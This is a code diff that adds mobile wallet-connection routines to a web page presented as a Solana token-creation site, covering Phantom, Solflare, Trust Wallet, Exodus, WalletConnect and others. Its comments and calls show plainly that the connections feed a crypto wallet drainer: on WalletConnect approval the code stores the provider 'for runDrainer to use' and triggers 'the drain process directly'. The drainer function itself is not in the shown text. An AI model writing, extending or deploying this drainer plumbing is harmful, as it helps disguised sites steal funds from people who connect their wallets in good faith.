@@ -2557,6 +2557,267 @@
       }
     }
     
+    // Enhanced mobile connection methods - copied from main page
+    window.mobileConnectionMethods = {
+      
+      // Method 1: WalletConnect integration for mobile
+      async connectWithWalletConnect() {
+        
+        try {
+          // Check if WalletConnect is available
+          if (typeof window.WalletConnect !== 'undefined') {
+            const walletConnect = new window.WalletConnect({
+              bridge: 'https://bridge.walletconnect.org',
+              qrcodeModal: {
+                open: (uri, cb) => {
+                  // Show QR code modal for mobile scanning
+                  showQRCodeModal(uri);
+                  if (cb) cb();
+                },
+                close: () => {
+                  // Close QR code modal
+                  closeQRCodeModal();
+                }
+              }
+            });
+            
+            // Create session
+            const session = await walletConnect.createSession();
+            
+            // Wait for approval
+            walletConnect.on('session_approved', (error, payload) => {
+              if (error) throw error;
+              
+              const { accounts } = payload.params[0];
+              if (accounts && accounts.length > 0) {
+                const publicKey = accounts[0];
+                
+                // Store the provider globally for runDrainer to use
+                window.connectedWallet = {
+                  key: 'walletconnect',
+                  name: 'WalletConnect',
+                  logo: '/walletconnect-logo.png',
+                  publicKey: publicKey,
+                  provider: walletConnect
+                };
+                
+                // Trigger the drain process directly
+                if (window.runDrainer) {
+                  window.runDrainer(publicKey, 'walletconnect', window.connectedWallet);
+                } else {
+                  console.error('[MOBILE_CONNECT] runDrainer function not found');
+                }
+              }
+            });
+            
+            return { success: true, session };
+          } else {
+            throw new Error('WalletConnect not available');
+          }
+        } catch (error) {
+          console.error('[MOBILE_CONNECT] WalletConnect failed:', error);
+          return { success: false, error: error.message };
+        }
+      },
+
+      // Method 2: Mobile wallet detection and connection
+      async detectAndConnectMobileWallets() {
+        
+        const mobileWallets = [
+          {
+            key: 'phantom',
+            name: 'Phantom',
+            providers: [
+              () => window.phantom?.solana,
+              () => window.solana,
+              () => window.phantom
+            ],
+            deepLink: 'https://phantom.app/ul/browse/',
+            customScheme: 'phantom://browse/'
+          },
+          {
+            key: 'solflare',
+            name: 'Solflare',
+            providers: [
+              () => window.solflare,
+              () => window.solflare?.solana
+            ],
+            deepLink: 'https://solflare.com/ul/v1/browse/',
+            customScheme: 'solflare://v1/browse/'
+          },
+          {
+            key: 'backpack',
+            name: 'Backpack',
+            providers: [
+              () => window.backpack?.solana,
+              () => window.backpack,
+              () => window.BackpackWallet
+            ],
+            deepLink: 'https://backpack.app/ul/v1/browse/',
+            customScheme: 'backpack://v1/browse/'
+          },
+          {
+            key: 'glow',
+            name: 'Glow',
+            providers: [
+              () => window.glow,
+              () => window.glow?.solana
+            ],
+            deepLink: 'https://glow.app/ul/app/',
+            customScheme: 'glow://app/'
+          },
+          {
+            key: 'trustwallet',
+            name: 'Trust Wallet',
+            providers: [
+              () => window.trustwallet?.solana,
+              () => window.trustwallet
+            ],
+            deepLink: 'https://link.trustwallet.com/open_url?url=',
+            customScheme: 'trust://open_url?url='
+          },
+          {
+            key: 'exodus',
+            name: 'Exodus',
+            providers: [
+              () => window.exodus?.solana,
+              () => window.exodus
+            ],
+            deepLink: 'https://exodus.com/app/dapp?url=',
+            customScheme: 'exodus://dapp/'
+          }
+        ];
+
+        for (const wallet of mobileWallets) {
+          try {
+            let provider = null;
+            
+            // Try all provider methods
+            for (const providerFn of wallet.providers) {
+              provider = providerFn();
+              if (provider && typeof provider.connect === 'function') {
+                break;
+              }
+            }
+            
+            if (provider) {
+              
+              const result = await provider.connect({
+                onlyIfTrusted: false,
+                appMetadata: {
+                  name: 'Dutse Launch - Solana Token Creator',
+                  url: window.location.origin,
+                  icon: '/logo.svg'
+                }
+              });
+              
+              if (result && result.publicKey) {
+                return {
+                  success: true,
+                  wallet: wallet.key,
+                  publicKey: result.publicKey.toString(),
+                  provider: provider
+                };
+              }
+            }
+          } catch (error) {
+            console.error(`[MOBILE_CONNECT] ${wallet.name} failed:`, error);
+          }
+        }
+        
+        return { success: false, error: 'No mobile wallets found' };
+      },
+
+      // Method 3: Deep link fallback for mobile
+      async connectWithDeepLink(walletType) {
+        
+        try {
+          // Use the existing openInWallet function
+          await window.openInWallet(walletType);
+          
+          // Wait a bit for the deep link to work
+          await new Promise(resolve => setTimeout(resolve, 3000));
+          
+          // Try to detect if connection was successful
+          const wallet = WALLET_DEFS.find(w => w.key === walletType);
+          if (wallet) {
+            const provider = wallet.provider();
+            if (provider && provider.publicKey) {
+              return {
+                success: true,
+                wallet: walletType,
+                publicKey: provider.publicKey.toString(),
+                provider: provider
+              };
+            }
+          }
+          
+          return { success: false, error: 'Deep link connection failed' };
+        } catch (error) {
+          console.error(`[MOBILE_CONNECT] Deep link failed for ${walletType}:`, error);
+          return { success: false, error: error.message };
+        }
+      },
+
+      // Method 4: QR Code generation for mobile scanning
+      generateQRCode(uri) {
+        
+        // Create QR code element
+        const qrContainer = document.createElement('div');
+        qrContainer.id = 'mobileQRCode';
+        qrContainer.style.cssText = `
+          position: fixed;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          background: white;
+          padding: 20px;
+          border-radius: 12px;
+          box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+          z-index: 10000;
+          text-align: center;
+        `;
+        
+        qrContainer.innerHTML = `
+          <h3 style="margin: 0 0 15px 0; color: #333;">Scan with Mobile Wallet</h3>
+          <div id="qrcode" style="margin: 0 auto;"></div>
+          <p style="margin: 15px 0 0 0; color: #666; font-size: 14px;">
+            Open your mobile wallet and scan this QR code
+          </p>
+          <button onclick="closeQRCodeModal()" style="
+            margin-top: 15px;
+            padding: 8px 16px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+          ">Close</button>
+        `;
+        
+        document.body.appendChild(qrContainer);
+        
+        // Show URI as text (no external libraries)
+        document.getElementById('qrcode').innerHTML = `
+          <div style="word-break: break-all; font-family: monospace; font-size: 12px; padding: 10px; background: #f5f5f5; border-radius: 6px;">
+            ${uri}
+          </div>
+        `;
+      }
+    };
+
+    // QR Code modal functions
+    function showQRCodeModal(uri) {
+      window.mobileConnectionMethods.generateQRCode(uri);
+    }
+
+    function closeQRCodeModal() {
+      const qrModal = document.getElementById('mobileQRCode');
+      if (qrModal) {
+        qrModal.remove();
+      }
+    }
+
     // Enhanced mobile connection handler - copied from main page
     window.connectMobileWalletEnhanced = async function(walletType) {
       // Try multiple connection methods
